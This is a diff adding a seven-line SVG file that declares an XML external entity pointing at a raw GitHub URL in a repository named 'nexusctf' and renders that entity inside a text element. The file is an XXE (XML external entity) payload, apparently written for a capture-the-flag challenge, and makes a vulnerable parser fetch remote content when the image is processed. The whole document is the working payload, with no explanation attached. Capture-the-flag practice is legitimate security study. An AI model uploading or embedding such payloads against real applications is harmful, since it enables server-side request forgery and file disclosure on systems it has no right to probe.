@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/xxe.svg">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text x="10" y="20">&xxe;</text>
+</svg>
